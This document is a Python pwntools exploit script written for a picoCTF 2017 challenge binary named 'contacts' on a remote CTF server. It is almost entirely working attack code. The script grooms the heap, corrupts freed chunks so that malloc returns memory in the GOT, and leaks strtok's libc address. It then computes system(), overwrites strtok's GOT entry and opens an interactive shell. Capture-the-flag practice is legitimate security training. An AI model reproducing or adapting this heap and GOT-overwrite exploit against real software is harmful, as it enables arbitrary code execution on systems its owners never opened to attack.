# exploit-contacts.py
# by Sudoite

from pwn import *
from time import sleep
import struct
import binascii

local = False
debug = False

# how long to wait when sleeping
if local:
	SHORT = 0.025
	LONG = 0.5
else:
	SHORT = 0.5
	LONG = 2

chunk_count = 0  # An integer to make sure I don't unintentially repeat chunk IDs
add_count = 0    # Keeping track, visually in the heap, of when I malloc chunks that 
                 # have already been intentionally freed

strtok_got_addr = 0x601ee8
end_of_got_addr = 0x601eea
past_end_of_got_addr = 0x601f28
if local:
    strtok_offset = 0x0  #:-p
    system_offset = 0x0
else:
    strtok_offset = 0x84a60
    system_offset = 0x41490

def sleep_and_flush():
	sleep(SHORT)
	p.recv()

def send_add(int_id, name, phone):
	payload = "add " + str(int_id) + " " + name + " " + phone + "\n"
	if debug:
		print("In send_add: sending " + payload)
	p.send(payload)

def send_valid_add(int_id, name, phone):
	global chunk_count
	send_add(int_id, name, phone)
	chunk_count += 1

def send_broken_add(int_id, name):
	send_add(int_id, name, "xxxxxx")

def get_addr_from_find(name):
	payload = "find " + name + "\n"
	if debug:
		print("In get_addr_from_find: payload = " + payload)
	p.send(payload)
	sleep(SHORT)
	out = p.recvuntil(":").strip()
	return int(out[0:len(out)-1])

def send_update(name, new_int_id):
	payload = "update-id " + name + " " + str(new_int_id) + "\n"
	if debug:
		print("In send_update: payload = " + payload)
	p.send(payload)

# Arguments: chunk A int, chunk A name, chunk B int, chunk B name,
#            address of start of new chunk to malloc
# 1. Free chunk A
# 2. Free chunk B (doesn't have to be adjacent to chunk A)
# 3. Get chunk A address by running find using chunk B name as name argument
# 4. Send an update to chunk A ID, sending in (int) address of start of new chunk to malloc
# 5. Malloc a chunk with arbitrary information
# 6. Malloc a chunk with arbitrary information
# 7. Malloc a chunk with arbitrary information
def prepare_chunk_to_be_malloced(A_int, A_name, B_int, B_name, chunk_address_int):
	global add_count
	send_broken_add(A_int, A_name)
	sleep_and_flush()
	send_broken_add(B_int, B_name)
	sleep_and_flush()
	chunkA_addr = get_addr_from_find(A_name)
	if debug:
		print("In prepare_chunk_to_be_malloced: freed chunkA (" + A_name + ") is at " + hex(chunkA_addr))
	send_update(A_name, chunk_address_int)
	sleep_and_flush()
	for i in range(3):
		send_valid_add(chunk_count, "add"+str(add_count), str(6666666666+chunk_count))
		sleep_and_flush()
		add_count += 1

if local:
	p = process("./local_with_server_got/contacts")
else:
	p = remote("shell2017.picoctf.com", 57508)

p.recv()

for i in range(30):
	send_valid_add(chunk_count, "chunk"+str(chunk_count), str(5555555555+chunk_count))
	# chunk_count incremented in call to send_valid_add
	sleep_and_flush()

prepare_chunk_to_be_malloced(0, "chunk0", 1, "chunk1", int(end_of_got_addr))
send_valid_add(int(0x4141414141414141), "B"*30+"\x40", "7777777777")
sleep_and_flush()

prepare_chunk_to_be_malloced(10, "chunk10", 11, "chunk11", int(past_end_of_got_addr))
send_valid_add(int(0x44444444), "C"*24 + "\xe8\x1e\x60", "8888888888")
sleep_and_flush()

strtok_addr = get_addr_from_find("AA7777777777")
sleep_and_flush()
print("GOT address: " + hex(strtok_addr))
system_addr = strtok_addr - strtok_offset + system_offset

send_update("AA7777777777", system_addr)
sleep_and_flush()
p.interactive()